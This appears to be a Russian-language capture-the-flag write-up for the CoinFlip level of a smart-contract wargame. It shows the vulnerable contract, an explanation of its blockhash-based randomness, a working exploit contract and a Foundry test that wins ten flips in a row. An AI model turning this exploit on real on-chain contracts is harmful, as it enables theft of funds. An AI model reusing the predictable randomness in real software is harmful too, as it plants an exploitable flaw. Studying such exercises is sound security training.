# 3. CoinFlip
Контракт представляет из себя игру с подбрасыванием монетки. В данной задаче требуется угадать исход подброса монетки 10 раз подряд, предугадав результат.

Код контракта `CoinFlip.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

Значение фактора `FACTOR` представляет из себя `uint256(type(bytes32).max) / 2`.
Также, в одном блоке удачно можно вызвать только одну функцию подбрасывания монетки. 

Псевдослучайное значение `blockValue` вычисляется так: `uint256(blockhash(block.number - 1))`. То есть, это значение может быть `>=` или `<` чем фактор.

Сторона монеты `coinFlip`, которую нужно угадать, вычисляется через `blockValue / FACTOR`. Из предыдущего вывода, значение будет либо `0`, либо `1`.

Контракт эксплоита `CoinFlipExploit.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipExploit {
    address public targetContractAddress;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    error TransactionFailed();
    error NotGuessed();

    constructor(address _targetContractAddress) {
        targetContractAddress = _targetContractAddress;
    }

    function exploit() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        (bool success, bytes memory data) = targetContractAddress.call{value: 0}(
            abi.encodeWithSignature("flip(bool)", side)
        );
        if (!success) {
            revert TransactionFailed();
        }

        bool win = abi.decode(data, (bool));
        if (!win) {
            revert NotGuessed();
        }
    }
}
```

Контракт теста экплоита `CoinFlipExploit.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {CoinFlip} from "src/CoinFlip/CoinFlip.sol";
import {CoinFlipExploit} from "src/CoinFlip/CoinFlipExploit.sol";

contract CoinFlipExploitTest is Test {
    CoinFlip public target;
    CoinFlipExploit public exploit;
    uint256 public currentBlock = 100;

    function setUp() public {
        target = new CoinFlip();
        exploit = new CoinFlipExploit(address(target));

        currentBlock = 100;
        vm.roll(currentBlock);
    }

    function test_Exploit() public {
        uint256 oldConsecutiveWins = target.consecutiveWins();
        for (uint8 i = 0; i < 10; ++i) {
            vm.setBlockhash(
                currentBlock - 1,
                bytes32(vm.randomBytes8())
            );

            exploit.exploit();

            vm.roll(++currentBlock);
        }
        uint256 newConsecutiveWins = target.consecutiveWins();

        assertEq(oldConsecutiveWins, 0);
        assertEq(newConsecutiveWins, 10);
    }
}
```